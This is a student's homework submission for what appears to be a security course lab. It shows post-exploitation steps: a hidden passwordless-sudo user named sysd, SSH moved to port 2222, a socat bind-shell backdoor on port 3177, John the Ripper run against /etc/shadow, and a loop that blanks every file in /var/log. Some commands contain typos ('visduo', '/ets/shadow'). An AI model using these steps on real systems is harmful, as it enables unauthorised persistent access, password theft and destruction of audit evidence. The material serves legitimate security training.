## Submission for Unit 6 Advanced Bash Homework

Create a secret user named `sysd`. Make sure this user doesn't have a home folder created.
- useradd --system --no-create-home sysd

Give your secret user a password. 
- sudo passwd sysd

Give your secret user a system UID < 1000.
- useradd --system --no-create-home sysd

Give your secret user the same GID
- useradd --system --no-create-home sysd

Give your secret user full sudo access without the need for a password.
- sudo visduo
- sysd ALL=(ALL) NOPASSWD:ALL

Test that sudo access works without your password
- sudo -l
```bash
Your BASH commands go here
``` 

## Allow ssh access over port 2222.
nano /etc/ssh/sshd_config
change #Port 22 to Port 2222 in nano.
systemctl restart ssh
```bash
Your BASH commands go here
``` 

Note the IP address of this system:
- ifconfig
Exit the root accout.
- exit
SSH to the machine using your sysd account and port 2222
- ssh sysd@172.17.149.133 -p 2222
Use sudo to switch to the root user
- sudo su root

### Create a backdoor with socat
- Install socat
  - sudo apt install socat
- Run Socat command in the background
  - socat TCP4-Listen:3177,fork EXEC:/bin/bash
- Explain each part of the `socat` command:
  - socat TCP4-Listen:3177,fork EXEC:/bin/bash
  TCP4 is a keyword that specifies a certain address type. The command listens on the 3177 port, and accepts the TCP connection with an IP version of 4. Forks a new child process for each connection. It executes the program /bin/bash.
  - socat STDIO TCP4:<Your-VM-IP-address>:3177
  	STDIO reads and writes to standard input and output. This socat transfers data between STDIO and a TCP4 connection to port 3177 of the host, in which case is the IP address of the VM. 
- Exit the SSH session
  - exit
- Test socat connection from your local machine (after the second socat command)
  - ls 
- Close the `socat` connection.
  - exit

## Crack _all_ the passwords
Ssh back to the system using your sysd account
- ssh sysd@172.17.149.133 -p 2222
- Use John to crack the entire /etc/shadow file
    - cd Documents
    - ls -a
    - john -rules -wordlist=.pass_list.txt
    - john -salts:-2 /ets/shadow

## Cover your tracks
- Use socat and a for loop to clear all system logs.
- socat STDIO TCP4:192.168.47.136:3177
for log in $(ls /var/log); do echo '' > /var/log/${log} ;done 